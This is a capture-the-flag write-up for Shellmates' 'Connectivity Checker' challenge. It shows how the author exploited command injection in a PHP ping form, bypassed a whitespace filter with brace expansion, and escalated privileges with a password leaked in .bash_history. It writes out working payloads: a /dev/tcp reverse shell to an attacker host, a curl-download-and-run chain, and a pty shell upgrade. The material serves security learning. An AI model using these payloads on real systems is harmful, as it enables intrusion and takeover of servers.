# Connectivity Checker CTF Writeup

This CTF was made by [Shellmates Club](shellmates.club/).

## The full CTF assignment:

Greetings infosec community!
We hope you're doing good as well as your loved ones. Today, we have concocted a new challenge for you in the web security field.  🕸️  
Here is the statement of the challenge:

=-=-=-=-=-=-=-= Task =-=-=-=-=-=-=-=  
My friend made a simple web application that pings hosts on the internet to see if they're up. When I asked him if he thought about the security part, he seemed so confident and started talking about his filter.  
Go there and prove him that his web application is not that secure by leaking the content of /home/ctf/flag.txt.  
Challenge url:  [http://web.challs.shellmates.club/](http://web.challs.shellmates.club/?fbclid=IwAR2PkWxv575RmCa5UQ9XaMiDK4LRWGVfhbxy2Xn-GH-RYwFD8sBRAoji3e4)

Note: No scanning, enumeration, nor brute forcing is required, this challenge is pretty straight forward.  
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

DM us the flag as a proof of compromise, and eventually, your writeup for the challenge so it gets featured in the next post!  
Good luck, and stay safe!  💪🏻

Link to the [Original Post](https://www.facebook.com/shellmates/posts/2894907780565646)

 ## Hints:
 

 In the [Original Post](https://www.facebook.com/shellmates/posts/2894907780565646), they gave us some useful hints:
> - /home/ctf/flag.txt. 

> - Note: No scanning, enumeration, nor brute forcing is required, this challenge is pretty straight forward. 

> - PS: Getting Remote Code Execution is just the first step, you have to escalate your privileges. Note the file permissions on flag.txt.
 
Those hints mean that:
 
 - The file in in ```/home/ctf/flag.txt``` , and the user is `ctf`.
 - We won't make any `scanning`, `enumeration`, nor `brute forcing`.
 - We should get Remote Code Execution and escalate our privileges.

So Let's BEGIN.
## Let's Begin:
From the index page, we know that it is a **PHP** server, so let's use the good old trick: adding **`';`** to the input, and the result was expected,

    Okay BOOMER
So, we can say that they are using an **Input Filter** to stop any input with unwanted characters.
### Understanding the magic behind the PING:
A quick search on `How can we make a Ping test using a server running PHP` will reveal that the PHP execute a command to the server shell, so we have to use that for our advantage.
Let's try submitting `127.0.0.1&&ls`and see what we will have as an output:

```PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.  
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms  
  
--- 127.0.0.1 ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 0.028/0.028/0.028/0.000 ms  
index.php
```
**WOW**, so we are right.
Let's try `127.0.0.1&&cat index.php` and see:
 ```
 Okay BOOMER
 ```
 And Again 🤦‍♂️.
 
 So, we will add the white space to unwanted characters' list, and find another way to execute our commands.
 What if we used *Brace Expansion* ?
 Let's try submitting `127.0.0.1&&{cat,index.php}` :
```
Connectivity Checker
Check out this great pinging tool!
  
if (isset($_POST["ip"])) {  
$ip = $_POST["ip"];  
if (preg_match('/^(.*)[\s;](.*)$/', "$ip")) {  
echo ' ```
if (isset($_POST["ip"])) {  
$ip = $_POST["ip"];  
if (preg_match('/^(.*)[\s;](.*)$/', "$ip")) {  
echo '

Okay BOOMER

';  
}  
else {  
$output = shell_exec('(echo "ping -c 1 '."$ip".'" | bash) 2> /dev/null');  
echo '

Output:  
  
'.nl2br("$output").'

';  
}  
}  
?>
```

**Now we are talking** 😎.

So in order execute our commands, we will use this format.
## Get a Reverse Shell:
Getting a reverse shell is important, so let's set up our NetCat Listener.

> **We should configure our Router for Port Forwarding**

```$ ncat -l -vv -p <PORT>```

Executing the command :
```127.0.0.1&&{bash,-i,>&,/dev/tcp/<External-IP>/<PORT>,0>&1}```
Will give us Nothing, and it's because of the way the `index.php` was written, the variable that gives the IP address to ping sais:
```$output = shell_exec('(echo "ping -c 1 '."$ip".'" | bash) 2> /dev/null');```
So let's find another way to execute the command, and what about making a small *bash script* that handle the command execution for us?
Well, let's try it:
Let's write our ***bash script*** and save it with the name `exploit.sh`:
```
#!/bin/bash

bash -i >& /dev/tcp/<External-IP>/<PORT> 0>&1
```
But the question is: **How can we do it ?**
And the easy answer is to download it to the server is using `wget` or `curl`,but which one ?
Starting with `wget`, so if we execute `localhost&&{ls,/usr/bin/wget}`, we get nothing, which means that it doesn't existe.
What about `curl`?
Well, executing `localhost&&{ls,/usr/bin/wget}`will give us this output:
`/usr/bin/curl`
Now, we know that we should use `curl`, and for that we will need a **simple HTTP server** in order to download the exploit in the server, and I think the simple thing is to create one with just one command using **Python**:
```
$ python3 -m http.server
```

And finally, we are ready to execute our file in the server, and we know that the best place to execute our ***bash script*** from is the `/tmp/`folder, let's do it:
```
127.0.0.1&&{cd,/tmp/}&&{curl,--output,exploit.sh,<External-IP>:<Port>/exploit.sh}&&./exploit.sh
```
And now we are ready.
## What do we have other than 'flag.txt' file ?
As you may know, it's always to check everything we can in order to have the biggest amount of data around our target, and so let's take a look at what do we have in the `/home/ctf/`folder:
```
$ ls -al /home/ctf
```
and the result is:
```
drwxr-xr-x 1 root root 4096 Apr 13 12:30 .  
drwxr-xr-x 1 root root 4096 Apr 12 10:29 ..  
-rw-r--r-- 1 ctf ctf 42 Apr 13 12:30 .bash_history  
-rw-r--r-- 1 ctf ctf 220 May 15 2017 .bash_logout  
-rw-r--r-- 1 ctf ctf 3526 May 15 2017 .bashrc  
-rw-r--r-- 1 ctf ctf 675 May 15 2017 .profile  
-r-------- 1 ctf ctf 46 Apr 9 09:51 flag.txt
```
Let's check the `.bash_history` file and see:
```
ls -al  
sduo -s  
Qu4r4Nt1n3d!@  
sudo -s  
exit
```
And it looks like someone has misspelled the word `sudo`, but what about this strange string `Qu4r4Nt1n3d!@` ?
So we know that we should enter our password when we want to execute the `sudo -s` command, and it seems like our friend who misspelled the word `sudo`, also he wrote his password in the terminal before realizing that.
## The Last Step:
After we found what looks like the `ctf` user's password, let's try to login using his name and password, for that we need to use the command `su`, but the problem we face is that is returns:
```
su: must be run from a terminal
```
So, the way to solve it is to upgrade our limited shell, and one of the ways to do so is by using the **Python**'s [pty module](https://docs.python.org/2/library/pty.html), so lets do it:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
```
 And now if we check for the `su`command:
```
$ su - ctf
```
It asks us for the password, and by entering the password we found above:
```
Password: Qu4r4Nt1n3d!@
```
AND WE DID IT !
The final thing to do is: '*you guessed it*'
```
$ cat flag.txt
shellmates{b3_c4r3FuL_w1t|-|_CMD_1nj3ct1i0N!}
````
# Final Thoughts:
I think this challenge was really well build by the [Shellmates Club](shellmates.club/), because it tries to give us an idea about how things work under the hood, and how a simple thing like forgetting to delete the `bash history` can take us down.
# Finally:
Special thanks to [Shellmates Club](shellmates.club/) for this amazing opportunity to learn,
and also, a special thanks to:
**[Bilal Retiat](https://philomath213.github.io/),  [Redouane Niboucha](https://red0xff.github.io/) and Abdelaziz BOUHOUN**
for their amazing help they gave me in my first CTF.